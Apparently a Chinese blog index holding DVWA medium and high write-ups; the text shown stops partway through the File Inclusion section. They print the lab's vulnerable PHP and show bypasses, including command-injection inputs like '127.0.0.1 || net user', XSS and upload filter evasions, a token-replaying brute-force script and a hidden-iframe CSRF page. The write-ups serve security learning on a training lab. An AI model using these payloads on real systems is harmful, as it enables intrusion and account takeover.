&#125;else&#123; return &#39;yes&#39;; &#125; &#125; return &#39;no,not exists&#39;; &#125; echo searchArr($arr, 15);","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect-time.xyz/tags/php%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}]},{"title":"基于DVWA的web漏洞原理-medium","slug":"dvwa-medium","date":"2018-07-13T12:17:58.000Z","updated":"2022-07-05T06:58:08.000Z","comments":true,"path":"2018/07/13/dvwa-medium/","link":"","permalink":"https://perfect-time.xyz/2018/07/13/dvwa-medium/","excerpt":"low完了就很快了","text":"low完了就很快了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123; // 去掉输入的用户名中的特殊字符 $user = $_GET[ &#39;username&#39; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 去掉输入的密码中的特殊字符 $pass = $_GET[ &#39;password&#39; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // 获取用户的详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // 登录失败 sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 服务器端在low的基础上增加了mysql_real_escape_string()函数，这个函数可以对字符串中的特殊符号进行转义，基本上抵御了sql注入 当然这种抵御方式也不是万能的，通过构造编码也可以绕过 详情请见：http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html 同时$pass也做了md5校验，杜绝了password注入 虽然加入了防爆破机制(sleep(2))，但是2秒的沉睡并不算什么 直接用bp爆破就好了 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; // 获取输入的值 $target = $_REQUEST[ &#39;ip&#39; ]; // 设置黑名单 $substitutions = array( &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39; =&gt; &#39;&#39;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; // linux $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; // 反馈给用户 echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 跟low相比也只多了将&amp;&amp;和;这两个字符过滤掉，继续用||命令就好了 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; // 检查请求来自哪里 if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) &#123; // 获取输入的值 $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // 两次输入的密码是否匹配 if( $pass_new == $pass_conf ) &#123; // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // 不是可信任的来源 echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; stripos(string,find,start) 查找find在string中出现的位置，没有找到则返回false 服务器想通过检查http包头的Referer参数的值中有没有要访问的主机名来抵御CSRF攻击Referer主要用来让服务器判断来源页面 逻辑是判断Referer参数中有没有目的主机的名，而Referer参数中会把完整的域名写进去，所以绕过的方法很简单，只要攻击者把攻击页面的名字改为目的主机的主机名即可绕过 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数值 $file = $_GET[ &#39;page&#39; ]; // 输入检查 $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 可以看见多了一个输入检查，利用str_replace函数讲page的值中的http:\\\\等字符删除但是str_replace这个本身就是有漏洞的，只要重写就可以绕过，比如http:\\\\写成hthttp://tp://，str_replace函数只会删除一个http:\\\\ 其他操作都与low的文件包含一样 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // 文件信息 $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; // 检查是否为img if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // 文件夹是否能移动到新位置 if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123; // 不能 echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; &#125; else &#123; // 可以 echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // 图片不是Img时 echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; &#125; &#125; ?&gt; 可以看到，服务器对文件的类型和大小进行了限制，但是只检查了Content-Ytpy这个字段只要用bp抓包，把这个字段的值改为image&#x2F;png就可以绕过了 也可以利用文件包含的，不管是不是php文件，都会尝试当做php来执行的特性 用工具来包含我们上传的png文件，当然文件的内容是一句话木马 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) &#123; // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_POST[&#39;g-recaptcha-response&#39;] ); // 验证是否成功 if( !$resp ) &#123; // 验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; else &#123; // 验证成功，检查两次输入的密码是否一致 if( $pass_new == $pass_conf ) &#123; // 显示下一阶段 echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;&#123;$pass_new&#125;\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;&#123;$pass_conf&#125;\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;passed_captcha\\&quot; value=\\&quot;true\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; &#125; else &#123; // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; &#125; if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) &#123; // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // 检查是否做了第一阶段 if( !$_POST[ &#39;passed_captcha&#39; ] ) &#123; $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; // 检查密码是否匹配 if( $pass_new == $pass_conf ) &#123; // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，服务器在第二步验证的时候，增加了对passed_captcha的检查，如果第一阶段的验证码通过了，那么passed_captcha就会变成true 本质上跟low级别没什么区别，只要在包中多加一个passed_captcha&#x3D;true就好了 CSRF也一样，多加一条&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; 实际场景中，攻击者不可能知道这个多出来的参数是什么，所以第一步应该要先通过验证并且抓包，观察包中传了什么参数过去 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; // 获取输入的值 $id = $_POST[ &#39;id&#39; ]; // 转义sql语句中的特殊字符串 $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) &#123; // 显示值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125; ?&gt; 服务器先是使用mysql_real_escape_string函数将单引号以及双引号之类的特殊字符转义掉，再用下拉框来限制用户输入 下拉框很好解决，只要用bp抓包,直接在bp里面改就行 因为是数字型的注入，所以单引号基本用不着，只有在where语句上会用到单引号 将单引号以及单引号里面的内容全部转换成十六进制就可以绕过了，其他步骤同low SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; // 获取输入的值 $id = $_POST[ &#39;id&#39; ]; // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) &#123; // 反馈给用户 echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; &#125; else &#123; // 反馈给用户 echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; &#125; //mysql_close(); &#125; ?&gt; 设置了下拉框限制用户输入，同时也消除了反斜杠之类的字符，但是对注入并没有什么影响 用bp抓包，在bp里改参数就行了 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123; $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value); &#125; ?&gt; 将SessionID的值改为当前的时间 攻击者做的攻击流程跟low一样，只是多一步预估受害者进入系统的时间 XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123; $default = $_GET[&#39;default&#39;]; //不永许脚本标记 if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; &#125; &#125; ?&gt; 服务器端检查了输入的值是否为空，并且不允许出现script标签，出现了就把默认值改为english 只要在？default中间加一个#就可以绕过了，#后面的值不会传给服务器 或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件 ?default&#x3D;English&gt;&#x2F;option&gt; XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123; // 获取输入的值 $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; str_replace函数将输入的&lt;script&gt;删除 这个函数的绕过很简单，重写或者大小写替换都可以 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; // 获取输入的值 $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); &#125; ?&gt; strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。 用bp抓包，在name里用重写或者大小写就可以绕过了","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect-time.xyz/tags/dvwa/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"基于DVWA的web漏洞原理-high","slug":"dvwa-high","date":"2018-07-13T11:17:30.000Z","updated":"2022-07-05T06:57:54.000Z","comments":true,"path":"2018/07/13/dvwa-high/","link":"","permalink":"https://perfect-time.xyz/2018/07/13/dvwa-high/","excerpt":"有点骚♂","text":"有点骚♂ Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123; // 检查Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // 净化用户名输入 $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化密码输入 $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // 获取用户详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // 登录失败 sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; // 生成Anti-CSRF token generateSessionToken(); ?&gt; 服务器端代码加入了Token来抵御CSRF攻击以及无脑爆破，同时加入了mysqli_real_escape_string以及stripslashes函数来防止sql注入 anti-CSRF Token的原理是当用户访问时，生成一个随机的token，每当用户提交时，在服务器端比对一下token值是否正确 虽然加入了防爆破机制，但也只是防止了bp的无脑爆破，可以通过Python脚本来爆破，下面贴一个网上来找来的pyton脚本 from bs4 import BeautifulSoup import urllib2 header&#x3D;{ ‘Host’: ‘192.168.153.130’, ‘Cache-Control’: ‘max-age&#x3D;0’, ‘If-None-Match’: “307-52156c6a290c0”, ‘If-Modified-Since’: ‘Mon, 05 Oct 2015 07:51:07 GMT’, ‘User-Agent’: ‘Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;53.0.2785.116 Safari&#x2F;537.36’, ‘Accept’: ‘&#x2F;‘, ‘Referer’: ‘http://192.168.153.130/dvwa/vulnerabilities/brute/index.php‘, ‘Accept-Encoding’: ‘gzip, deflate, sdch’, ‘Accept-Language’: ‘zh-CN,zh;q&#x3D;0.8’, ‘Cookie’: ‘security&#x3D;high; PHPSESSID&#x3D;5re92j36t4f2k1gvnqdf958bi2’}requrl &#x3D; “http://192.168.153.130/dvwa/vulnerabilities/brute/“ def get_token(requrl,header): req &#x3D; urllib2.Request(url&#x3D;requrl,headers&#x3D;header) response &#x3D; urllib2.urlopen(req) print response.getcode(), the_page &#x3D; response.read() print len(the_page) soup &#x3D; BeautifulSoup(the_page,”html.parser”) user_token &#x3D; soup.form.input.input.input.input[“value”] #get the user_token return user_tokenuser_token &#x3D; get_token(requrl,header) i&#x3D;0 for line in open(“rkolin.txt”): requrl &#x3D; “http://192.168.153.130/dvwa/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i &#x3D; i+1 print i,’admin’,line.strip(), user_token &#x3D; get_token(requrl,header) if (i &#x3D;&#x3D; 10): break Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; // 获取输入的值 $target = trim($_REQUEST[ &#39;ip&#39; ]); // 设置黑名单 $substitutions = array( &#39;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39; =&gt; &#39;&#39;, &#39;| &#39; =&gt; &#39;&#39;, &#39;-&#39; =&gt; &#39;&#39;, &#39;$&#39; =&gt; &#39;&#39;, &#39;(&#39; =&gt; &#39;&#39;, &#39;)&#39; =&gt; &#39;&#39;, &#39;`&#39; =&gt; &#39;&#39;, &#39;||&#39; =&gt; &#39;&#39;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; // linux $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; // 反馈给用户 echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 服务器端设置了黑名单，将非法的字符删除为空字符 看似过滤了所有的非法字符，但是实际上是把’| ‘替换为空字符，而服务器执行命令时是自上而下执行的，所以把管道符改为||时，比如127.0.0.1 || net user，服务器从上往下，删除掉一个’| ‘后，原来的命令就变为127.0.0.1 | net user，结果还是一样的 当然直接用127.0.0.1|net user，也可以绕过 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; // 检查Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // 获取输入的值 $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) &#123; // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; // 生成Anti-CSRF token generateSessionToken(); ?&gt; 由于加入了Anti-CSRF token机制，所以当我们要攻击时，就必须先获取token 构造html页面： &lt;script type=&quot;text/javascript&quot;&gt; function attack() &#123; document.getElementsByName(&#39;user_token&#39;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#39;user_token&#39;)[0].value; document.getElementById(&quot;transfer&quot;).submit(); &#125; &lt;/script&gt; &lt;iframe src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt; &lt;/iframe&gt; &lt;body onload=&quot;attack()&quot;&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/body&gt; 当受害者访问这个页面时，脚本会在后台访问修改密码的页面，获取页面中的token，并向服务器发送修改密码的请求 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数 $file = $_GET[ &#39;page&#39; ]; // 输入检查 if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // 当输入的参数有误时 echo &quot;ERROR: File not found!&quot;; exit; &#125; ?&gt; fnmatch() 函数根据指定的模式来匹配文件名或字符串。 服务器端加入了检测机制，输入的page参数必须带有file才能包含 